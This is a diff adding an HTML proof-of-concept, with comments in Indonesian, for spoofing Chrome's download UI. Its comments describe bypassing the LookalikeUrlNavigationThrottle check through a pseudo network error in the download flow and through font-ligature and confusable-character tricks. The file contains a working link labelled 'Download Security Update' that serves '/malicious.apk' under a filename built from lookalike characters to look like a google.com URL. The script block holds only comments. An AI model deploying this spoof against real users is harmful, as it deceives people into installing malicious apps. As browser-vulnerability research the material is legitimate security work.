@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PoC: Download UI Spoof</title>
+    <!-- 
+    Inti: Memanfaatkan logika "pseudo error network" alur unduhan untuk melewati 
+    inspeksi anti-spoofing LookalikeUrlNavigationThrottle 
+    -->
+</head>
+<body>
+    <!-- 
+    Strategi 1: Menggunakan domain spoofing berbasis font ligature
+    Mengandalkan font Google Sans untuk merender karakter khusus sebagai tampilan domain yang berbeda
+    -->
+    <h2>Mekanisme Spoofing Unduhan</h2>
+    
+    <!-- 
+    Strategi 2: Memanfaatkan bypass karakter "://" dalam nama file UI unduhan
+    Menggunakan character confusable (karakter yang membingungkan secara visual) untuk memalsukan tampilan asal
+    Contoh: Mengganti "://" dengan ":⁚⧸⧸" karakter serupa
+    -->
+    <a href="/malicious.apk" 
+       download="https⁚⧸⧸google.com╱update.apk"
+       style="display:inline-block; padding:15px 30px; background:#0066cc; 
+              color:white; text-decoration:none; border-radius:5px;">
+        Download Security Update
+    </a>
+    
+    <script>
+        // PoC perlu memicu alur unduhan alami untuk menghasilkan pseudo error
+        // Tetapkan header respons khusus atau memicu tipe unduhan 
+        // melalui JavaScript untuk membiarkan Chrome secara otomatis menetapkan net_error_
+        
+        // Inti: Link unduhan harus memenuhi kondisi yang memicu 
+        // net::ERR_ABORTED (logika unduhan normal sudah cukup)
+    </script>
+</body>
+</html>
